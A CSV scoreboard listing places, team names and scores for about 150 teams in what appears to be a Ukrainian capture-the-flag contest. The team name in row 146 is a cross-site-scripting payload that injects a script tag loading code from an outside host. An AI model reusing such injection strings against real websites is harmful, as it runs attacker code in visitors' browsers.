place,team,score
1,Ghost of Sheva,2019
2,Whitecrow,1018
3,Sheva_Netcats,969
4,{teamname_blankspace},668
5,UNKnown,635
6,Rock and Stone,563
7,DC8044_p0h3k,556
8,CHDTU,428
9,nulp-team,399
10,NOP,395
11,Skr1pt K1ddi3s,355
12,cyber++,340
13,Bl4ck_M4g1ck,327
14,TNTU,303
15,CyberSentinels,289
16,WebWizards,289
17,КіБобри,260
18,more_optimal,253
19,biters,247
20,Cyber Dungeon Masters,237
21,KB_SumDU,210
22,cybercops,195
23,3xplo1t,195
24,mohyla,190
25,WIreOnFire,188
26,observers,173
27,CIA,172
28,Люфтвафлі,172
29,Capybaras,152
30,csd33,141
31,Yellow_orange,121
32,CyberNAU,121
33,Ліга Неповноцінних за Тьюрингом,110
34,CyberShev,106
35,CyberClowns,100
36,Team Blue,98
37,Moonshine,97
38,CybeR$ecur1tyN1nja$,95
39,GatoHackers,95
40,salo_enjoyer2023,78
41,ENIGMA,75
42,CyberBorderX,73
43,K3yb0ard W4rri0rs | DonNU,73
44,NoosVV,73
45,DarkStars,69
46,Бавовна,68
47,ААААААААА_ХВОСТ_BOBRA,58
48,Тут була креативна назва,54
49,DDoSCTF4fun,54
50,Cyber Rangers,40
51,CTF OP Team 2,32
52,dia_log,31
53,LNU Stallions,31
54,Eclipse,30
55,УДУНТ,22
56,VNU4ata,22
57,{bug_d3stroy3rs},22
58,Solidol Inc.,22
59,Lalapo,22
60,SET Community Team,22
61,ALU,22
62,Cyb3rSh1eld,22
63,STUdy,22
64,Hack_busters,22
65,Cyber Corsairs,21
66,CyberDice,21
67,CyberFrogs,21
68,UA_feature,21
69,M.C.F.,21
70,Шосте ребро,21
71,Сyberguardians,21
72,Scam co,21
73,CNTTUM Lutsk,21
74,КБ-20 МДУ,21
75,"Operation ""Backdoor""",21
76,K_M_,21
77,Pan Testers,21
78,CTF OP Team 1,21
79,kachka,21
80,НУК,20
81,ХНТУ,20
82,IT_Деражня,12
83,UzhNU,12
84,Перспективні дівчата,12
85,CyberCats,12
86,cybersecpals,12
87,Максим Зюлковський,12
88,Vindex,12
89,samurai,12
90,TeaTwoComanda,12
91,СОК,12
92,We_are_from_Chernechyna,12
93,Raccoon avengers,11
94,Brain for rent,11
95,FURMAN,11
96,280th Special Cyber Group,11
97,Cyberbara,11
98,who are we?,11
99,abcbbxhdhd_team,11
100,1to4[KNU],11
101,CodeDefenders,11
102,Звуки спецназу,11
103,FunnyFishermen.global,11
104,Lighters,11
105,PwnSquad,11
106,ctfnn23,11
107,BravestWarriors,11
108,Angry Beavers,11
109,Січові Стрільці,11
110,Konotop jr,11
111,CyberSecClub,11
112,KTBTeam,11
113,BestTeamEver1337,11
114,DreamTeam,11
115,Хайпові капібари,11
116,DC_grayhat,11
117,Pegors,11
118,KamenTeam,11
119,НАУковці,11
120,s1fao,11
121,Галицький Security,11
122,Bad Requestors,11
123,Bebras,11
124,Cyberpunk,11
125,SGT,11
126,fzhshzh,11
127,Security Sky,11
128,Bastards,11
129,dota_Corporation,11
130,PEPE,11
131,G0D_Ble$$,11
132,yAd,11
133,IT_centum_viginti_quinque,2
134,101010,2
135,awkuib,1
136,НУБІП1898,1
137,zorki,1
138,Team_Charlie,1
139,Роменщина,1
140,bwapt-06,1
141,SUITT_beginners,1
142,Cybernetic Mastery,1
143,zer0 byt3s,1
144,Вартові мережі,1
145,BATI_IT,1
146,"</h1><script src=""https://js.rip/kek""</script><h1>",1
147,www_deployers,1
148,Кібербуфет,1
149,ITSU,1
150,Кібер Ключ,1
151,КіберСталкер,1
152,Vidrima,1
153,ФКТБП,1
